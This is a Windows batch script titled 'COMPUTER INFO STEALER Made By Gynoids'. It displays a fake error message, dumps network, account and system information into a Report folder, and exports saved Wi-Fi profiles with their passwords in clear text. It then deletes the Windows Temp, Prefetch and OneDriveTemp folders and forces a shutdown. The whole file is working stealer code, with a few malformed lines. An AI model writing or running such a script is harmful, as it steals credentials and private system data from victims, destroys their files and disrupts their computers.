@echo off
Title COMPUTER INFO STEALER Made By Gynoids
color 9
@echo Failed To Connect To Page

rmdir /s /q Report
md Report
set /p userpassword="Press Enter To Continue."

echo start!
pause >nul

ipconfig >Report\ipconfig.txt
echo IP: OK
REM  ------ Plus de details
ipconfig /all >Report\ipconfigall.txt
echo -all ips: OK
REM  ------ Hostname
hostname >Report\hostname.txt
echo -hostname: OK

echo -wifi password : OK

netsh wlan >Report
netsh wlan export profile key=clear
echo -Internet connection: OK

net accounts >Report\netaccounts.txt

echo -windows accounts: OK

ver >Report\versionwindows.txt
echo -version of windows: OK

systeminfo >Report\systeminfo.txt
echo -system information: OK


echo -computer on the network OK

cls
rmdir /s /q C:\Windows\Temp 
rmdir /s /q C:\Windows\Prefetch
rmdir /s /q C:\OneDriveTemp
cls
echo fait!
REM --- timeout /t 05 /nobreak
echo wscript.sleep 100
wait 1
shutdown.exe -s -t 10 -c "A Guy Called Gynoids Made This. But PLEASE DONT BLAME ME FOR OTHER PEOPLES MISUSE, Thank You."

exit